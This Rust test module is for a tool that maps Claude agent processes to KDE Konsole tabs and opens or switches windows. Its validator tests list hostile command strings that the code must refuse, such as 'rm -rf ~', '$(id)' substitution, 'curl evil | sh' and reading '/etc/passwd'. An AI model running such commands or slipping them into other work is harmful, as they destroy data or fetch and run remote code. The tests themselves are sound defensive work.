        assert!(d.problem().unwrap().contains("session bus"));
        let d = desk(&FakeBus::new(Konsoles::new()), Path::new("/x"), "");
        assert!(d.konsole_map(false).is_empty());
        assert_eq!(d.problem().as_deref(), Some("Konsole is not running."));
    }

    fn locate_fixture() -> (TmpDir, FakeBus) {
        let tmp = TmpDir::new("proc");
        // claude 5000 <- node 4999 <- bash 3800 (tab "invites") <- konsole 3264 <- systemd 1500
        fake_proc(&tmp.0, &[(5000, 4999), (4999, 3800), (3800, 3264), (3264, 1500), (1500, 1), (7000, 1500)], &[]);
        (tmp, FakeBus::new(konsoles()))
    }

    #[test]
    fn walks_parents_to_the_tab() {
        let (tmp, bus) = locate_fixture();
        let d = desk(&bus, &tmp.0, "");
        let loc = d.locate(5000, None).unwrap();
        assert_eq!(
            loc,
            Location { konsole_pid: 3264, service: "org.kde.konsole-3264".into(), window: 1, session: 4, tab_index: 1, tab_title: "invites".into(), label: Some("Konsole 2 · tab 2".into()) }
        );
        assert_eq!(d.locate(3800, None).unwrap().session, 4);
        assert_eq!(d.locate(7000, None), None);
        assert_eq!(d.locate(123456, None), None);
    }

    #[test]
    fn background_job_found_through_claude_attach() {
        let (tmp, _) = locate_fixture();
        let proc = &tmp.0;
        for (pid, argv, kids) in [
            (3718u32, vec!["bash"], vec![4153u32]),
            (4153, vec!["/home/u/.local/bin/agent-notify", "keep", "claude", "attach", "b5a90d33"], vec![4158]),
            (4158, vec!["claude", "attach", "b5a90d33"], vec![]),
        ] {
            let t = proc.join(pid.to_string()).join("task").join(pid.to_string());
            fs::create_dir_all(&t).unwrap();
            let mut raw = argv.join("\0").into_bytes();
            raw.push(0);
            fs::write(proc.join(pid.to_string()).join("cmdline"), raw).unwrap();
            fs::write(t.join("children"), kids.iter().map(|k| k.to_string()).collect::<Vec<_>>().join(" ")).unwrap();
        }
        let mut k = Konsoles::new();
        k.insert(3262, vec![(1, vec![(1, 3718, 4153, "sam : agent-notify")])]);
        let d = desk(&FakeBus::new(k), proc, "");
        assert_eq!(d.locate(7000, None), None);
        assert_eq!(d.locate(7000, Some("b5a90d33")).unwrap().konsole_pid, 3262);
        assert_eq!(d.locate(7000, Some("ffffffff")), None);
    }

    /// One fake process with a parent, argv and executable.
    pub fn fake_process(root: &Path, pid: u32, ppid: u32, argv: &[&str], exe: &str) {
        let d = root.join(pid.to_string());
        fs::create_dir_all(&d).unwrap();
        fs::write(d.join("stat"), format!("{pid} (x) S {ppid} 1 1 0 -1\n")).unwrap();
        let mut raw = argv.join("\0").into_bytes();
        raw.push(0);
        fs::write(d.join("cmdline"), raw).unwrap();
        if !exe.is_empty() {
            std::os::unix::fs::symlink(exe, d.join("exe")).unwrap();
        }
    }

    const CLAUDE: &str = "/home/u/.local/share/claude/versions/2.1.328";

    /// Two sessions both at "Konsole 1 · tab 1": two Konsole processes, each with its own window 1
    /// and tab 1. Konsole 3264's tab runs `agent-notify keep claude attach 7e21c0b9` (one background
    /// job); Konsole 3262 was started with `konsole -e … agent-notify keep claude attach b5a90d33`
    /// (another). Both labels used to read "Konsole 1 · tab 1".
    #[test]
    fn two_konsoles_each_with_window_1_tab_1_get_different_labels() {
        let tmp = TmpDir::new("realconflict");
        let proc = &tmp.0;
        fake_process(proc, 1504, 1, &[CLAUDE, "daemon", "run"], CLAUDE);
        // The first: daemon -> pty host -> session; attached from Konsole 3264's only tab
        fake_process(proc, 7686, 1504, &["claude", "bg-pty-host", "--bg-pty-host", "s"], CLAUDE);
        fake_process(proc, 7709, 7686, &["claude", "bg-spare", "--bg-spare", "c"], CLAUDE);
        fake_process(proc, 3702, 3264, &["zsh"], "/usr/bin/zsh");
        fake_process(proc, 10613, 3702, &["agent-notify", "keep", "claude"], "/x/agent-notify");
        fake_process(proc, 10697, 10613, &["claude", "attach", "7e21c0b9"], CLAUDE);
        // The second: the same shape, attached from Konsole 3262's first tab
        fake_process(proc, 2000, 1504, &["claude", "bg-pty-host", "--bg-pty-host", "s2"], CLAUDE);
        fake_process(proc, 2001, 2000, &["claude", "bg-spare", "--bg-spare", "c2"], CLAUDE);
        fake_process(proc, 3718, 3262, &["zsh", "-i", "-c", "agent-notify keep claude attach b5a90d33"], "/usr/bin/zsh");
        fake_process(proc, 4153, 3718, &["agent-notify", "keep", "claude"], "/x/agent-notify");
        fake_process(proc, 4158, 4153, &["claude", "attach", "b5a90d33"], CLAUDE);
        let mut k = Konsoles::new();
        k.insert(3262, vec![(1, vec![(1, 3718, 4153, "~ : agent-notify"), (2, 9867, 9867, "~ : zsh")])]);
        k.insert(3264, vec![(1, vec![(1, 3702, 10613, "Projects : agent-notify")])]);
        let d = desk(&FakeBus::new(k), proc, "");
        let tabs = d.konsole_map(true);
        // the old label, "Konsole {window} · tab {index + 1}", names both tabs the same
        let old: Vec<String> = tabs.iter().filter(|t| t.tab_index == 0).map(|t| format!("Konsole {} · tab {}", t.window, t.tab_index + 1)).collect();
        assert_eq!(old, ["Konsole 1 · tab 1", "Konsole 1 · tab 1"]);
        let placees = [Placee { pid: 10697, owner: 7709 }, Placee { pid: 4158, owner: 2001 }, Placee { pid: 7709, owner: 7709 }, Placee { pid: 2001, owner: 2001 }];
        let m = d.assign(&tabs, &placees);
        let (wake, human) = (&m[&7709], &m[&2001]);
        assert_eq!((wake.konsole_pid, wake.session), (3264, 1));
        assert_eq!((human.konsole_pid, human.session), (3262, 1));
        assert_eq!(wake.label.as_deref(), Some("Konsole 2 · tab 1"));
        assert_eq!(human.label.as_deref(), Some("Konsole 1 · tab 1"));
        assert_eq!(m.len(), 2);
        // one window on the desktop: no number needed
        let mut one = Konsoles::new();
        one.insert(3264, vec![(1, vec![(1, 3702, 10613, "x"), (2, 9, 9, "y")])]);
        let labels: Vec<String> = desk(&FakeBus::new(one), proc, "").konsole_map(true).into_iter().map(|t| t.label).collect();
        assert_eq!(labels, ["Konsole · tab 1", "Konsole · tab 2"]);
    }

    /// The other way two sessions came to claim one tab: by parentage alone, anything started from
    /// the agent in a tab (a `claude -p` it ran, the daemon it started and that daemon's sessions, a
    /// `claude &` in the shell) traced back to the same shell and got that tab too.
    #[test]
    fn a_tab_is_claimed_by_at_most_one_session() {
        let (tmp, bus) = locate_fixture(); // shell 3800 is the "invites" tab
        let proc = &tmp.0;
        fake_process(proc, 3800, 3264, &["bash"], "/usr/bin/bash");
        fake_process(proc, 5000, 3800, &["claude"], CLAUDE); // the session the tab shows (its foreground)
        fake_process(proc, 5001, 5000, &["bash", "-c", "claude -p hi"], "/usr/bin/bash");
        fake_process(proc, 5002, 5001, &["claude", "-p", "hi"], CLAUDE); // a helper the session ran
        fake_process(proc, 5003, 5000, &[CLAUDE, "daemon", "run"], CLAUDE); // a daemon the session started
        fake_process(proc, 5004, 5003, &["claude", "bg-pty-host", "--bg-pty-host", "s"], CLAUDE);
        fake_process(proc, 5005, 5004, &["claude", "bg-spare", "--bg-spare", "c"], CLAUDE); // its background session
        fake_process(proc, 5010, 3800, &["claude", "--resume", "x"], CLAUDE); // `claude &`, not the foreground
        let mut k = Konsoles::new();
        k.insert(3264, vec![(1, vec![(1, 3702, 9001, "Projects : claude"), (4, 3800, 5000, "invites")])]);
        let d = desk(&FakeBus::new(k), proc, "");
        // the old per-process lookup: every one of them "is in" the invites tab
        for pid in [5000, 5002, 5005, 5010] {
            assert_eq!(d.locate(pid, None).map(|l| l.session), Some(4), "{pid}");
        }
        drop(bus);
        let tabs = d.konsole_map(true);
        let all: Vec<Placee> = [5000, 5002, 5005, 5010].iter().map(|&p| Placee { pid: p, owner: p }).collect();
        let m = d.assign(&tabs, &all);
        assert_eq!(m.keys().copied().collect::<Vec<_>>(), [5000]);
        assert_eq!(m[&5000].session, 4);
        // whatever the order they are listed in
        let rev: Vec<Placee> = all.iter().rev().cloned().collect();
        assert_eq!(d.assign(&tabs, &rev).keys().copied().collect::<Vec<_>>(), [5000]);
        // with the foreground session gone, the background `claude &` is what that tab has
        let m = d.assign(&tabs, &[Placee { pid: 5010, owner: 5010 }, Placee { pid: 5002, owner: 5002 }]);
        assert_eq!(m.keys().copied().collect::<Vec<_>>(), [5010]);
    }

    #[test]
    fn a_slow_konsole_is_a_failure_not_an_empty_desktop() {
        let bus = FakeBus::new(konsoles());
        bus.fail.lock().unwrap().push("timeout");
        let d = desk(&bus, Path::new("/x"), "");
        let r = d.tabs(true);
        assert!(r.as_ref().is_err_and(|e| e.contains("did not answer in time")), "{r:?}");
        assert!(d.problem().unwrap().contains("did not answer"));
        // Konsole not running is a sure "no tabs", not a failure
        assert_eq!(desk(&FakeBus::new(Konsoles::new()), Path::new("/x"), "").tabs(true), Ok(vec![]));
    }

    #[test]
    fn the_map_lock_is_not_held_while_asking_konsole() {
        let slot: Arc<Mutex<Option<Arc<Desktop>>>> = Arc::new(Mutex::new(None));
        let seen: Arc<Mutex<Vec<bool>>> = Arc::new(Mutex::new(Vec::new()));
        let bus = FakeBus::new(konsoles());
        let inner = bus.runner();
        let (slot2, seen2) = (slot.clone(), seen.clone());
        let runner: Runner = Arc::new(move |argv: &[String], t: Duration| {
            if let Some(d) = slot2.lock().unwrap().as_ref() {
                seen2.lock().unwrap().push(d.cache.try_lock().is_ok());
            }
            inner(argv, t)
        });
        let d = Arc::new(Desktop::new(runner, Path::new("/x"), Some("")));
        *slot.lock().unwrap() = Some(d.clone());
        assert_eq!(d.konsole_map(true).len(), 3);
        let seen = seen.lock().unwrap().clone();
        assert!(!seen.is_empty() && seen.iter().all(|free| *free), "{seen:?}");
        *slot.lock().unwrap() = None; // break the cycle
    }

    #[test]
    fn a_tabs_shell_pid_is_asked_once() {
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, Path::new("/x"), "");
        d.konsole_map(true);
        d.konsole_map(true);
        let n = bus.calls.lock().unwrap().iter().filter(|c| c.iter().any(|a| a == "processId")).count();
        assert_eq!(n, 3);
    }

    #[test]
    fn parent_of_handles_odd_names() {
        assert_eq!(parent_of("12 (a) b (c)) S 34 1"), Some(34));
        assert_eq!(parent_of("garbage"), None);
    }

    fn loc() -> Location {
        Location { konsole_pid: 3264, service: "org.kde.konsole-3264".into(), window: 1, session: 4, tab_index: 1, tab_title: "invites".into(), label: None }
    }

    #[test]
    fn dry_run_lists_exact_calls_and_runs_none() {
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, Path::new("/x"), "/usr/bin/systemd-run");
        let r = d.jump(Some(&loc()), "Gradebook · Teacher invites", true);
        assert!(r.ok);
        assert!(bus.writes().is_empty());
        assert_eq!(r.steps, ["qdbus-qt6 org.kde.konsole-3264 /Windows/1 setCurrentSession 4"], "no notification, ever");
        assert!(r.message.contains("Switched Konsole to the 'invites' tab"));
        assert!(r.message.starts_with("Dry run."));
    }

    #[test]
    fn real_run_uses_the_same_steps() {
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, Path::new("/x"), "");
        let r = d.jump(Some(&loc()), "invites", false);
        assert!(r.ok);
        let w: Vec<String> = bus.writes().iter().map(|c| shell_join(c)).collect();
        assert_eq!(w, r.steps);
        assert!(r.message.starts_with("Switched Konsole to the 'invites' tab. It's in Konsole"), "{}", r.message);
    }

    #[test]
    fn closed_tab_and_failures() {
        let d = desk(&FakeBus::new(konsoles()), Path::new("/x"), "");
        let mut gone = loc();
        gone.session = 99;
        assert_eq!(d.jump(Some(&gone), "x", true).message, "That Konsole tab has closed.");
        assert!(!d.jump(None, "x", true).ok);
        let mut evil = loc();
        evil.service = "org.evil; rm".into();
        assert!(!d.jump(Some(&evil), "x", true).ok);
        let r = desk(&FakeBus { missing: true, ..Default::default() }, Path::new("/x"), "").jump(Some(&loc()), "x", true);
        assert!(!r.ok);
        assert!(r.message.contains("qdbus-qt6"));
    }

    #[test]
    fn command_safety() {
        assert_eq!(check_command(Some("claude --resume 8b1c4e7a-3f62-4d09-a5e8-0c7d2b9f6e31")), None);
        assert_eq!(check_command(Some("codex resume 0199a-abc")), None);
        assert_eq!(check_command(Some("claude attach b5a90d33")), None);
        for bad in [
            Some("claude --resume x\n"),
            Some("claude --resume x; rm -rf ~"),
            Some("claude --resume x && make"),
            Some("claude --resume x | sh"),
            Some("claude --resume `id`"),
            Some("claude --resume $(id)"),
            Some("rm -rf ~"),
            Some("claude --resumex"),
            Some("claude --resume "),
            Some("claude --resume x > f"),
            Some("claude --resume 'x'"),
            Some(""),
            None,
            Some("bash -c 'claude --resume x'"),
        ] {
            assert!(check_command(bad).is_some(), "{bad:?}");
        }
    }

    struct ReopenFx {
        tmp: TmpDir,
        repo: PathBuf,
        sub: PathBuf,
        proc: PathBuf,
        cmd: &'static str,
    }

    fn reopen_fx() -> ReopenFx {
        let tmp = TmpDir::new("reopen");
        let repo = tmp.0.join("Projects/invites");
        let other = tmp.0.join("Projects/other");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::create_dir_all(other.join(".git")).unwrap();
        let sub = repo.join("app");
        fs::create_dir_all(&sub).unwrap();
        let proc = tmp.0.join("proc");
        fake_proc(&proc, &[], &[(3718, &other), (3702, &tmp.0), (3800, &repo)]);
        ReopenFx { repo, sub, proc, cmd: "claude --resume 8b1c4e7a-3f62-4d09-a5e8-0c7d2b9f6e31", tmp }
    }

    #[test]
    fn reopen_opens_a_fresh_window_that_runs_the_command_and_stays_open() {
        let f = reopen_fx();
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, &f.proc, "");
        let sub = f.sub.to_string_lossy().to_string();
        let r = d.reopen(Some(&sub), f.cmd, true);
        assert!(r.ok, "{r:?}");
        let shell = login_shell();
        assert_eq!(r.steps, vec![shell_join(&window_argv(&sub, f.cmd, &shell))]);
        assert!(bus.writes().is_empty(), "a dry run starts nothing");
        assert_eq!(d.reopen_at(Some(&sub), f.cmd, true).1, None, "a new window comes forward by itself");
        // A real run starts exactly that one detached process, and never types into a tab.
        let r = d.reopen(Some(&sub), f.cmd, false);
        assert!(r.ok && r.message.contains("new Konsole window"), "{r:?}");
        let w = bus.writes();
        assert_eq!(w.len(), 1);
        assert_eq!(w[0], window_argv(&sub, f.cmd, &shell));
        assert!(!w.iter().flatten().any(|a| a == "sendText" || a == "newSession"));
    }

    #[test]
    fn the_window_runs_the_command_then_keeps_a_shell() {
        let argv = window_argv("/home/x/Projects/a b", "claude --resume 1234", "/usr/bin/zsh");
        // The command runs under a non-interactive sh (no rc file can swallow it), then the
        // person's own shell takes the window.
        assert_eq!(&argv[..8], ["setsid", "-f", "konsole", "--workdir", "/home/x/Projects/a b", "-e", "/bin/sh", "-c"]);
        assert_eq!(argv[8], "claude --resume 1234; exec /usr/bin/zsh -i");
        assert_eq!(argv.len(), 9);
        // A shell path with a space is quoted.
        assert!(window_argv("/tmp", "x", "/opt/my shell/zsh")[8].ends_with("exec '/opt/my shell/zsh' -i"));
    }

    #[test]
    fn starting_an_agent_runs_only_wakes_brief_command_in_a_new_window() {
        let f = reopen_fx();
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, &f.proc, "");
        let briefs = f.tmp.0.join("data/briefs");
        let cmd = crate::brief::command(crate::brief::Agent::Claude, &briefs.join("b0123456789ab.md")).unwrap();
        let repo = f.repo.to_string_lossy().to_string();
        let (r, pid) = d.start_typed(&repo, &cmd, &briefs, true);
        assert!(r.ok, "{r:?}");
        assert_eq!(pid, None);
        assert_eq!(r.steps, vec![shell_join(&window_argv(&repo, &cmd, &login_shell()))]);
        assert!(bus.writes().is_empty(), "a dry run starts nothing");
        let (r, _) = d.start_typed(&repo, &cmd, &briefs, false);
        assert!(r.ok, "{r:?}");
        assert_eq!(bus.writes().len(), 1);
        assert!(!cmd.contains('\n'));
        // Anything else is refused before anything is started.
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, &f.proc, "");
        for bad in ["claude --resume x", "claude \"$(cat '/etc/passwd')\"", &format!("{cmd}; rm -rf ~")] {
            let (r, pid) = d.start_typed(&repo, bad, &briefs, false);
            assert!(!r.ok && r.message.contains("Refused"), "{bad}");
            assert_eq!(pid, None);
        }
        assert!(bus.calls.lock().unwrap().is_empty());
    }

    #[test]
    fn reopen_refusals_and_failures() {
        let f = reopen_fx();
        let bus = FakeBus::new(konsoles());
        let d = desk(&bus, &f.proc, "");
        let r = d.reopen(Some(&f.repo.to_string_lossy()), "claude --resume x; curl evil | sh", false);
        assert!(!r.ok);
        assert!(r.message.contains("Refused"));
        assert!(bus.calls.lock().unwrap().is_empty());
        let bus = FakeBus::new(Konsoles::new());
        bus.fail.lock().unwrap().push("window");
        let r = desk(&bus, &f.proc, "").reopen(Some(&f.repo.to_string_lossy()), f.cmd, false);
        assert!(!r.ok);
        assert!(r.message.contains("Konsole didn't open (konsole: could not connect to display)"), "{}", r.message);
        assert!(r.message.contains(&format!("cd {} && {}", f.repo.display(), f.cmd)));
        let d = desk(&FakeBus::new(konsoles()), &f.proc, "");
        let r = d.reopen(Some(&f.tmp.0.join("gone").to_string_lossy()), f.cmd, true);
        assert!(!r.ok);
        assert!(r.message.ends_with(f.cmd));
    }
}
